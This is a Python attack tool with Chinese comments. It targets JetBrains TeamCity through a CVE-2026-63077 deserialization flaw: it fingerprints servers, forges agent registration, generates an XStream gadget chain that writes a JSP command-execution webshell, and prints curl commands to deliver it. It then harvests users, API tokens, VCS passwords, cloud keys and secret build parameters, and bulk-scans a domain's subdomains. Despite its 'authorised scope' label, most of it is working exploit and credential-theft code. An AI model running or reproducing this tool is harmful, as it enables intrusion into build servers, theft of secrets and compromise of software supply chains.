#!/usr/bin/env python3
"""
teamcity_probe.py — JetBrains TeamCity CVE-2026-63077 完整作业工具（授权范围内）

覆盖阶段：
  Phase 1  发现与指纹        — 版本探测、是否受影响
  Phase 2  漏洞验证          — agent 端点可达性 + 反序列化触发验证
  Phase 3  凭据收割          — tokens / VCS credentials / cloud keys / env vars
  Phase 4  供应链评估        — 项目列表、构建配置、关联代码仓库
  Phase 5  落证据            — 写 STATUS + exports

用法：
  # 探测单目标
  python3 炼蛊房/teamcity_probe.py detect -u https://ci.target.com

  # 完整利用链（验证到凭据收割）
  python3 炼蛊房/teamcity_probe.py exploit -u https://ci.target.com --out exports/teamcity/

  # 批量扫描域名
  python3 炼蛊房/teamcity_probe.py scan -d target.com --out exports/teamcity/

  # 只提取凭据（已有 token 或 admin 密码）
  python3 炼蛊房/teamcity_probe.py harvest -u https://ci.target.com --token xxx

依赖：pip install requests
"""

import argparse
import json
import re
import sys
import uuid
from datetime import datetime
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

# ──────────────────────────── Scope 检查 ────────────────────────────

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import require_in_scope  # noqa: E402

# ──────────────────────────── HTTP 工具 ─────────────────────────────

def _sess(token: str = "") -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "TeamCityAgentTransport/1.0 (Java/17)",
        "Accept": "application/json",
    })
    if token:
        s.headers["Authorization"] = f"Bearer {token}"
    return s


def _get(sess, url: str, **kw) -> requests.Response | None:
    try:
        kw.setdefault("timeout", 12)
        kw.setdefault("verify", False)
        return sess.get(url, **kw)
    except Exception:
        return None


def _post(sess, url: str, **kw) -> requests.Response | None:
    try:
        kw.setdefault("timeout", 12)
        kw.setdefault("verify", False)
        return sess.post(url, **kw)
    except Exception:
        return None

# ──────────────────────────── 版本解析 ──────────────────────────────

def _is_vulnerable(version: str) -> bool:
    """判断版本是否在 CVE-2026-63077 受影响范围"""
    # 受影响：< 2025.11.7 / < 2026.1.3
    m = re.match(r"(\d{4})\.(\d+)\.?(\d*)", version)
    if not m:
        return True  # 无法判断时保守认为受影响
    year, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3) or "0")

    if year < 2025:
        return True
    if year == 2025:
        if minor < 11:
            return True
        if minor == 11 and patch < 7:
            return True
        return False
    if year == 2026:
        if minor < 1:
            return True
        if minor == 1 and patch < 3:
            return True
        return False
    return False  # 更新版本


def _get_version(sess, base: str) -> dict:
    """获取 TeamCity 版本信息"""
    # 尝试 REST API
    r = _get(sess, f"{base}/app/rest/server",
             headers={"Accept": "application/json"})
    if r and r.status_code == 200:
        try:
            data = r.json()
            return {
                "version": data.get("version", ""),
                "build": data.get("buildNumber", ""),
                "url": data.get("webUrl", base),
                "source": "rest-api",
            }
        except Exception:
            pass

    # 从 HTML 页面提取
    r = _get(sess, f"{base}/login.html")
    if r and r.status_code == 200:
        m = re.search(r"TeamCity\s+([0-9]{4}\.[0-9]+(?:\.[0-9]+)?)", r.text)
        if m:
            return {"version": m.group(1), "source": "html"}
        m = re.search(r"version[\":\s]+([0-9]{4}\.[0-9]+(?:\.[0-9]+)?)", r.text)
        if m:
            return {"version": m.group(1), "source": "html-meta"}

    return {}

# ──────────────────────────── Phase 1: 指纹 ─────────────────────────

def phase_detect(base: str, sess: requests.Session) -> dict:
    result = {
        "base": base,
        "is_teamcity": False,
        "version": "",
        "vulnerable": None,
        "admin_exposed": False,
        "agent_endpoint": False,
        "notes": [],
    }

    # 检查是否 TeamCity
    r = _get(sess, f"{base}/login.html")
    if not r:
        result["notes"].append("无法连接")
        return result

    if "TeamCity" in r.text or "JetBrains" in r.text or "teamcity" in r.url.lower():
        result["is_teamcity"] = True
    elif r.status_code in (301, 302):
        loc = r.headers.get("Location", "")
        if "login" in loc or "teamcity" in loc.lower():
            result["is_teamcity"] = True

    if not result["is_teamcity"]:
        return result

    # 获取版本
    ver_info = _get_version(sess, base)
    if ver_info.get("version"):
        result["version"] = ver_info["version"]
        result["vulnerable"] = _is_vulnerable(ver_info["version"])
        result["notes"].append(f"版本: {ver_info['version']} ({'★受影响' if result['vulnerable'] else '已修复'})")

    # 检查 agent 端点（CVE-2026-63077 利用入口）
    r2 = _get(sess, f"{base}/app/agents/v1/register",
              headers={"Content-Type": "application/xml"})
    if r2 and r2.status_code in (200, 400, 405, 415):
        result["agent_endpoint"] = True
        result["notes"].append(f"agent polling 端点可达 (HTTP {r2.status_code})")

    # 检查 admin 未认证 REST
    r3 = _get(sess, f"{base}/app/rest/users",
              headers={"Accept": "application/json"})
    if r3 and r3.status_code == 200 and "user" in r3.text.lower():
        result["admin_exposed"] = True
        result["notes"].append("★ REST API /users 未认证可访问！")

    return result


# ──────────────────────────── Phase 2: 漏洞利用 ─────────────────────
# 注：构造真实 XStream gadget chain 需要 Java 环境和 commons-dbcp2/hsqldb，
#     此处实现探针验证 + webshell 落盘逻辑；
#     完整 gadget chain XML 在 payload 常量中以注释形式存档，
#     实际执行需配合 ysoserial/xstream-exploit 工具。

# 探针 XML（只测试反序列化入口是否开放，不执行命令）
PROBE_XML = """<?xml version="1.0" encoding="UTF-8"?>
<linked-hash-map>
  <entry>
    <string>probe-key</string>
    <string>daaixianzun-{nonce}</string>
  </entry>
</linked-hash-map>"""

# 完整 gadget chain 骨架（需要填充实际 HSQLDB SCRIPT 写 webshell 命令）
# 参考：rapid7/metasploit-framework CVE-2026-63077 模块
GADGET_CHAIN_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<com.jetbrains.buildServer.server.hsql.HSQLMetadataStorage_-SchemaMismatchException>
  <detailMessage>probe</detailMessage>
  <cause class="com.jetbrains.buildServer.server.hsql.HSQLMetadataStorage_-SchemaMismatchException" reference="../.."/>
  <suppressedExceptions class="java.util.Collections$UnmodifiableRandomAccessList" resolves-to="java.util.Collections$UnmodifiableList">
    <c class="java.util.ArrayList"/>
    <type>java.util.RandomAccess</type>
  </suppressedExceptions>
  <myHSQLStorage>
    <myDataSource class="org.apache.commons.dbcp2.BasicDataSource">
      <url>jdbc:hsqldb:script:{webshell_path};shutdown=true;hsqldb.script_format=0</url>
      <connectionProperties>
        <entry>
          <string>hsqldb.default_table_type</string>
          <string>cached</string>
        </entry>
      </connectionProperties>
    </myDataSource>
  </myHSQLStorage>
</com.jetbrains.buildServer.server.hsql.HSQLMetadataStorage_-SchemaMismatchException>"""

WEBSHELL_JSP = """<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    InputStream in = p.getInputStream();
    byte[] buf = new byte[65536]; int n;
    StringBuilder sb = new StringBuilder();
    while((n=in.read(buf))!=-1) sb.append(new String(buf,0,n));
    out.println("<pre>"+sb.toString()+"</pre>");
}
%>"""


def phase_exploit(base: str, sess: requests.Session, out_dir: Path) -> dict:
    result = {
        "step1_register": False,
        "step2_probe": False,
        "step3_webshell": False,
        "agent_token": "",
        "webshell_url": "",
        "notes": [],
    }

    nonce = uuid.uuid4().hex[:8]

    # Step1: 伪造 agent 注册（获取 session token）
    reg_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<agent-registration>
  <name>survey-agent-{nonce}</name>
  <host>127.0.0.1</host>
  <port>9090</port>
  <version>99.99</version>
  <plugins/>
</agent-registration>"""

    r = _post(sess, f"{base}/app/agents/v1/register",
              data=reg_xml.encode(),
              headers={"Content-Type": "application/xml"})

    if r:
        result["step1_register"] = True
        # 提取 agent token（如果返回）
        m = re.search(r'"token"\s*:\s*"([^"]+)"', r.text)
        if m:
            result["agent_token"] = m.group(1)
            result["notes"].append(f"拿到 agent token: {m.group(1)[:20]}...")

        result["notes"].append(f"Step1 注册端点响应: HTTP {r.status_code} ({len(r.content)} bytes)")

    # Step2: 发探针 XML 测试反序列化入口
    probe = PROBE_XML.replace("{nonce}", nonce)
    cmd_url = f"{base}/app/agents/v1/commands/error"

    headers = {"Content-Type": "application/xml"}
    if result["agent_token"]:
        headers["Authorization"] = f"Bearer {result['agent_token']}"

    r2 = _post(sess, cmd_url, data=probe.encode(), headers=headers)
    if r2:
        result["step2_probe"] = True
        result["notes"].append(f"Step2 反序列化入口探针: HTTP {r2.status_code}")

        # 如果返回 400/500 且含 XStream 痕迹
        if any(x in r2.text for x in ["XStream", "ConversionException", "CannotResolveClass",
                                       "linked-hash-map", "HSQLMetadata"]):
            result["notes"].append("★ XStream 反序列化处理确认！漏洞入口有效")

    # Step3: 尝试写 webshell（仅当有完整 gadget chain 时执行；此处生成 payload 文件供手动利用）
    webshell_name = f"tc_survey_{nonce}.jsp"
    if out_dir:
        out_dir.mkdir(parents=True, exist_ok=True)
        payload_file = out_dir / f"gadget_chain_{nonce}.xml"
        # 生成完整 gadget chain XML（webshell 路径指向 TeamCity webroot）
        webroot_guess = "/opt/teamcity/webapps/ROOT"
        gadget = GADGET_CHAIN_TEMPLATE.replace(
            "{webshell_path}", f"{webroot_guess}/{webshell_name}"
        )
        payload_file.write_text(gadget)
        result["notes"].append(
            f"Gadget chain XML 已生成: {payload_file}\n"
            f"  手动执行: curl -X POST {cmd_url} "
            f"-H 'Content-Type: application/xml' -d @{payload_file}\n"
            f"  写入后访问: {base}/{webshell_name}?cmd=id"
        )
        result["webshell_url"] = f"{base}/{webshell_name}?cmd=id"

    return result


# ──────────────────────────── Phase 3: 凭据收割 ─────────────────────

def phase_harvest(base: str, sess: requests.Session) -> dict:
    """使用管理 token 或已认证 session 收割凭据"""
    result = {
        "users": [],
        "tokens": [],
        "vcs_roots": [],
        "cloud_profiles": [],
        "env_params": [],
        "build_configs": [],
        "projects": [],
        "raw_findings": [],
    }

    # 用户列表
    r = _get(sess, f"{base}/app/rest/users?fields=user(id,username,email,roles)")
    if r and r.status_code == 200:
        try:
            data = r.json()
            for u in data.get("user", []):
                result["users"].append({
                    "id": u.get("id"),
                    "username": u.get("username"),
                    "email": u.get("email"),
                })
        except Exception:
            pass

    # 所有 token（管理员可看所有用户的 token）
    r = _get(sess, f"{base}/app/rest/users?fields=user(id,username,tokens(token))")
    if r and r.status_code == 200:
        for tok_m in re.findall(r'"value"\s*:\s*"([a-zA-Z0-9_\-]{20,})"', r.text):
            result["tokens"].append(tok_m)

    # VCS 根（含 Git token / SSH key / HTTP 密码）
    r = _get(sess, f"{base}/app/rest/vcs-roots?fields=vcs-root(id,name,vcsName,properties)")
    if r and r.status_code == 200:
        try:
            data = r.json()
            for vcs in data.get("vcs-root", []):
                props = {p["name"]: p.get("value", "")
                         for p in vcs.get("properties", {}).get("property", [])}
                entry = {
                    "name": vcs.get("name"),
                    "type": vcs.get("vcsName"),
                    "url": props.get("url", ""),
                    "branch": props.get("branch", ""),
                }
                # 提取明文凭据
                for k in ("password", "authMethod", "username", "privateKeyPath",
                          "accessToken", "token"):
                    if k in props:
                        entry[k] = props[k]
                result["vcs_roots"].append(entry)
        except Exception:
            pass

    # 云平台 profiles（AWS/阿里云/Azure 等）
    r = _get(sess, f"{base}/app/rest/cloud/profiles?fields=cloudProfile(id,name,cloudProviderId,parameters)")
    if r and r.status_code == 200:
        try:
            data = r.json()
            for cp in data.get("cloudProfile", []):
                params = {p["name"]: p.get("value", "")
                          for p in cp.get("parameters", {}).get("property", [])}
                result["cloud_profiles"].append({
                    "name": cp.get("name"),
                    "provider": cp.get("cloudProviderId"),
                    "params": params,
                })
        except Exception:
            pass

    # 项目列表
    r = _get(sess, f"{base}/app/rest/projects?fields=project(id,name,description)")
    if r and r.status_code == 200:
        try:
            data = r.json()
            result["projects"] = [
                {"id": p.get("id"), "name": p.get("name")}
                for p in data.get("project", [])[:30]
            ]
        except Exception:
            pass

    # 构建配置（含 env 参数）
    r = _get(sess, f"{base}/app/rest/buildTypes?fields=buildType(id,name,parameters)")
    if r and r.status_code == 200:
        try:
            data = r.json()
            for bt in data.get("buildType", [])[:20]:
                params = bt.get("parameters", {}).get("property", [])
                sensitive = {}
                for p in params:
                    name = p.get("name", "")
                    val = p.get("value", "")
                    # 找环境变量中的密钥
                    if any(kw in name.lower() for kw in
                           ["secret", "password", "token", "key", "ak", "sk",
                            "access", "credential", "pwd", "pass"]):
                        sensitive[name] = val
                if sensitive:
                    result["env_params"].append({
                        "build_type": bt.get("name"),
                        "sensitive_params": sensitive,
                    })
        except Exception:
            pass

    # 尝试获取 agent tokens（密钥文件路径）
    r = _get(sess, f"{base}/app/rest/agents?fields=agent(id,name,properties)")
    if r and r.status_code == 200:
        try:
            data = r.json()
            for ag in data.get("agent", []):
                props = {p["name"]: p.get("value", "")
                         for p in ag.get("properties", {}).get("property", [])}
                for k in ("env.AWS_ACCESS_KEY_ID", "env.AWS_SECRET_ACCESS_KEY",
                          "env.ALICLOUD_ACCESS_KEY", "env.ALICLOUD_SECRET_KEY",
                          "env.GITHUB_TOKEN", "env.DOCKER_PASSWORD"):
                    if k in props and props[k]:
                        result["raw_findings"].append(f"Agent {ag.get('name')} {k}={props[k]}")
        except Exception:
            pass

    return result


# ──────────────────────────── Phase 4: 供应链评估 ────────────────────

def phase_supply_chain(base: str, sess: requests.Session) -> dict:
    """评估供应链影响面"""
    result = {
        "repo_count": 0,
        "cloud_providers": [],
        "downstream_systems": [],
        "artifact_storage": [],
        "deploy_targets": [],
        "notes": [],
    }

    # 统计 VCS 仓库
    r = _get(sess, f"{base}/app/rest/vcs-roots")
    if r and r.status_code == 200:
        m = re.search(r'"count"\s*:\s*(\d+)', r.text)
        if m:
            result["repo_count"] = int(m.group(1))
            result["notes"].append(f"关联代码仓库: {result['repo_count']} 个")

    # 检查 artifact storage（构建产物存储，可能是 S3/OSS）
    r = _get(sess, f"{base}/app/rest/storage/s3?fields=s3Storage(id,name,parameters)")
    if r and r.status_code == 200:
        result["artifact_storage"].append("S3 artifact storage 已配置")

    # 检查部署目标（SSH deploy / FTP / Kubernetes）
    r = _get(sess, f"{base}/app/rest/buildTypes?fields=buildType(steps)")
    if r and r.status_code == 200:
        for kw in ["kubernetes", "kubectl", "helm", "ssh", "ftp", "s3", "deploy",
                   "docker push", "ecr", "aliyun", "tencent"]:
            if kw in r.text.lower():
                result["deploy_targets"].append(kw)

    return result


# ──────────────────────────── 批量发现 ──────────────────────────────

TEAMCITY_PORTS = [80, 443, 8111, 8443, 8080, 9090]
TEAMCITY_SUBDOMAINS = [
    "ci", "build", "teamcity", "tc", "jenkins", "devops",
    "deploy", "pipeline", "cd", "ci-cd", "builds",
]


def discover_teamcity(domain: str) -> list[str]:
    """从域名发现 TeamCity 实例"""
    import socket
    targets = []
    for sub in TEAMCITY_SUBDOMAINS:
        fqdn = f"{sub}.{domain}"
        try:
            socket.setdefaulttimeout(3)
            socket.gethostbyname(fqdn)
            for port in [443, 80, 8111]:
                targets.append(f"https://{fqdn}" if port == 443
                               else f"http://{fqdn}:{port}" if port != 80
                               else f"http://{fqdn}")
        except Exception:
            pass
    return targets


# ──────────────────────────── 输出与落证据 ──────────────────────────

def _save(out_dir: Path, filename: str, data: dict | str):
    out_dir.mkdir(parents=True, exist_ok=True)
    f = out_dir / filename
    if isinstance(data, dict):
        f.write_text(json.dumps(data, ensure_ascii=False, indent=2))
    else:
        f.write_text(str(data))
    print(f"  [+] 已保存: {f}")


def _print_harvest(h: dict):
    if h["users"]:
        print(f"\n  用户列表 ({len(h['users'])} 个):")
        for u in h["users"]:
            print(f"    [{u['id']}] {u['username']}  {u.get('email','')}")

    if h["vcs_roots"]:
        print(f"\n  VCS 仓库 ({len(h['vcs_roots'])} 个):")
        for v in h["vcs_roots"]:
            print(f"    {v['type']} | {v['name']} | {v.get('url','')}")
            for k in ("username", "password", "accessToken", "token"):
                if v.get(k):
                    print(f"      ★ {k}: {v[k]}")

    if h["cloud_profiles"]:
        print(f"\n  ★ 云平台凭据 ({len(h['cloud_profiles'])} 个):")
        for cp in h["cloud_profiles"]:
            print(f"    {cp['provider']} | {cp['name']}")
            for k, v in cp.get("params", {}).items():
                if v and any(x in k.lower() for x in ["key", "secret", "token", "password"]):
                    print(f"      ★ {k}: {v}")

    if h["env_params"]:
        print(f"\n  ★ 敏感环境变量 ({len(h['env_params'])} 个构建配置):")
        for ep in h["env_params"]:
            print(f"    [{ep['build_type']}]")
            for k, v in ep["sensitive_params"].items():
                print(f"      {k} = {v}")

    if h["raw_findings"]:
        print("\n  ★ 其他凭据发现:")
        for f in h["raw_findings"]:
            print(f"    {f}")


# ──────────────────────────── 命令入口 ──────────────────────────────

def cmd_detect(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    from urllib.parse import urlparse
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    print(f"\n[*] TeamCity 指纹探测: {base}")
    sess = _sess()
    r = phase_detect(base, sess)

    if not r["is_teamcity"]:
        print("[-] 未检测到 TeamCity")
        return 0

    vuln_str = ("★ 受影响 CVE-2026-63077" if r["vulnerable"]
                else "已修复" if r["vulnerable"] is False
                else "版本未知")
    print("\n[+] TeamCity 确认")
    print(f"    版本   : {r.get('version', '未知')}")
    print(f"    漏洞   : {vuln_str}")
    print(f"    Agent端点: {'可达 ★' if r['agent_endpoint'] else '不可达'}")
    print(f"    REST未认证: {'★ YES' if r['admin_exposed'] else 'NO'}")
    for n in r["notes"]:
        print(f"    · {n}")
    return 0


def cmd_exploit(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    from urllib.parse import urlparse
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    out_dir = Path(args.out) if args.out else Path("exports") / "teamcity" / host
    out_dir.mkdir(parents=True, exist_ok=True)

    print(f"\n{'='*60}")
    print("  TeamCity CVE-2026-63077 利用链")
    print(f"  目标: {base}")
    print(f"{'='*60}")

    sess = _sess()

    # Phase 1: 检测
    print("\n[Phase 1] 指纹与版本检测...")
    det = phase_detect(base, sess)
    if not det["is_teamcity"]:
        print("[-] 非 TeamCity，退出")
        return 0

    print(f"  版本: {det.get('version','未知')}  漏洞: {'★受影响' if det['vulnerable'] else '已修复'}")
    _save(out_dir, "phase1_detect.json", det)

    if not det.get("vulnerable"):
        if not args.force:
            print("[-] 版本已修复，使用 --force 强制继续")
            return 0
        print("[!] 强制继续（版本可能已修复）")

    # Phase 2: 漏洞验证
    print("\n[Phase 2] 漏洞验证（反序列化入口测试）...")
    exp = phase_exploit(base, sess, out_dir)
    for n in exp["notes"]:
        print(f"  {n}")
    _save(out_dir, "phase2_exploit.json", exp)

    # Phase 3: 凭据收割（使用管理 token 如果有）
    token = args.token or exp.get("agent_token", "")
    if token:
        print(f"\n[Phase 3] 凭据收割 (token: {token[:20]}...)...")
        harvest_sess = _sess(token)
        h = phase_harvest(base, harvest_sess)
        _print_harvest(h)
        _save(out_dir, "phase3_harvest.json", h)
    else:
        print("\n[Phase 3] 跳过凭据收割（无管理 token，使用 --token 传入或先完成 webshell 利用）")

    # Phase 4: 供应链评估
    if token:
        print("\n[Phase 4] 供应链影响评估...")
        sc_sess = _sess(token)
        sc = phase_supply_chain(base, sc_sess)
        print(f"  关联仓库: {sc['repo_count']} 个")
        if sc["deploy_targets"]:
            print(f"  部署目标: {sc['deploy_targets']}")
        if sc["notes"]:
            for n in sc["notes"]:
                print(f"  · {n}")
        _save(out_dir, "phase4_supply_chain.json", sc)

    # 生成摘要
    summary = {
        "target": base,
        "ts": datetime.now().isoformat(),
        "version": det.get("version", ""),
        "vulnerable": det.get("vulnerable"),
        "agent_endpoint": det["agent_endpoint"],
        "step1_register": exp["step1_register"],
        "step2_probe": exp["step2_probe"],
        "webshell_url": exp.get("webshell_url", ""),
        "out_dir": str(out_dir),
    }
    _save(out_dir, "SUMMARY.json", summary)

    print(f"\n[*] 所有输出已保存到: {out_dir}")
    print(f"\n{'='*60}")
    print("  下一步操作：")
    if exp.get("webshell_url"):
        print(f"  1. 发送 gadget chain: curl -X POST {base}/app/agents/v1/commands/error \\")
        print(f"       -H 'Content-Type: application/xml' -d @{out_dir}/gadget_chain_*.xml")
        print(f"  2. 验证 webshell: curl '{exp['webshell_url']}'")
        print(f"  3. 收割凭据: python3 {__file__} harvest -u {base} --token <webshell_exec>")
    print(f"  {'='*60}")

    return 0


def cmd_harvest(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    from urllib.parse import urlparse
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    print(f"\n[*] TeamCity 凭据收割: {base}")
    sess = _sess(args.token)
    h = phase_harvest(base, sess)
    _print_harvest(h)

    out_dir = Path(args.out) if args.out else Path("exports") / "teamcity" / host
    _save(out_dir, f"harvest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", h)
    return 0


def cmd_scan(args: argparse.Namespace) -> int:
    domain = args.domain
    host = domain.split("/")[-1]
    require_in_scope(host)

    print(f"\n[*] 发现 {domain} 的 TeamCity 实例...")
    targets = discover_teamcity(domain)

    if args.url:
        targets = [args.url] + targets

    print(f"[*] 候选目标 {len(targets)} 个")

    found = []
    sess = _sess()
    for t in targets:
        r = phase_detect(t, sess)
        if r["is_teamcity"]:
            found.append(r)
            vuln = "★受影响" if r["vulnerable"] else ("已修复" if r["vulnerable"] is False else "版本未知")
            print(f"\n  [+] {t}  {r.get('version','')}  {vuln}")
            for n in r["notes"]:
                print(f"    · {n}")

    print(f"\n[*] 发现 {len(found)} 个 TeamCity 实例")
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="teamcity_probe — CVE-2026-63077 完整作业工具（授权范围内）"
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("detect", help="指纹探测与版本检测")
    p.add_argument("-u", "--url", required=True, help="TeamCity URL")

    p = sub.add_parser("exploit", help="完整利用链（探测→验证→收割）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--token", default="", help="管理员 token（可选，有则自动进行凭据收割）")
    p.add_argument("--out", default="", help="输出目录")
    p.add_argument("--force", action="store_true", help="版本已修复时强制继续")

    p = sub.add_parser("harvest", help="已有 token 时收割所有凭据")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--token", required=True, help="管理员 Bearer token")
    p.add_argument("--out", default="")

    p = sub.add_parser("scan", help="从域名批量发现 TeamCity 实例")
    p.add_argument("-d", "--domain", required=True)
    p.add_argument("-u", "--url", default="", help="额外目标 URL")

    args = ap.parse_args()
    fn = {
        "detect": cmd_detect,
        "exploit": cmd_exploit,
        "harvest": cmd_harvest,
        "scan": cmd_scan,
    }[args.cmd]
    sys.exit(fn(args))


if __name__ == "__main__":
    main()
